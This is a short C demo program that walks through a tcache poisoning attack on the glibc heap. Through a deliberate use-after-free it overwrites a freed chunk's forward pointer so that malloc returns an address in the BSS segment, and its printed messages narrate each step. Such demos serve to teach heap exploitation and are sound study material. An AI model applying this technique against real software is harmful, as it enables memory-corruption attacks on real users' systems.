#include <stdio.h>
#include <string.h>
#include <stdlib.h>

unsigned long target;

int main(int argc, char **argv){
	system("clear");
	puts("\t\t\t\t\t [Tchache Attack]");
	puts("\t\t\t\t\t-----------------");
	
	fprintf(stderr, "- This is a demo used to demonstrate the tcache attack. This can be compiled in the lastest version of libc\n");
	fprintf(stderr, "- We will use this attack to make malloc() return a pointer that is not on the heap but rather on the BSS Segment.\n");
	

	unsigned long *a, *b; // Allocation of 2 fast bin chunks;
		
	a = (unsigned long *) malloc(0x10);
	b = (unsigned long *) malloc(0x10);
	fprintf(stderr, "\n- The allocated 2 chunks:\n\tChunk(a) == %p\n\tChunk(b) == %p\n\n", a, b);
	puts("- We free() the fastbin chunks and therefore they are now inserted into the tcache.\n");
	free(a);
	free(b);
	fprintf(stderr, "- Since the chunks are in the tcache therefore their (fd) pointers have been updated.\n\tChunk(a):%p --> [This is the last chunk in the bin. Thus the (fd) is null]\n\tChunk(b):%p --> [This points to chunk (a) that is the next chunk in the bin]\n", (unsigned long ) a[0], (unsigned long) b[0]);
	fprintf(stderr, "\n- The address of target: (%p:%p)\n", &target, target);
	puts("");
	puts("- We therefore edit the (fd) pointer of chunk(b) to point to our region in the bss segment (target's address) using a UAF bug.");
	b[0] = (unsigned long) &target;
	fprintf(stderr, "\n- The new (fd) pointer of chunk (b):\n\t Chunk(b) == %p\n", *b);
	puts("");
	fprintf(stderr, "- First pointer returned by malloc: \n\t --> [%p] (This is the same pointer as chunk(b))\n", malloc(0x10));			
	fprintf(stderr, "- The second pointer returned by malloc: \n\t --> [%p] (This is the same pointer as the address of Target =))\n", malloc(0x10));
	puts("");
	return 0;
}
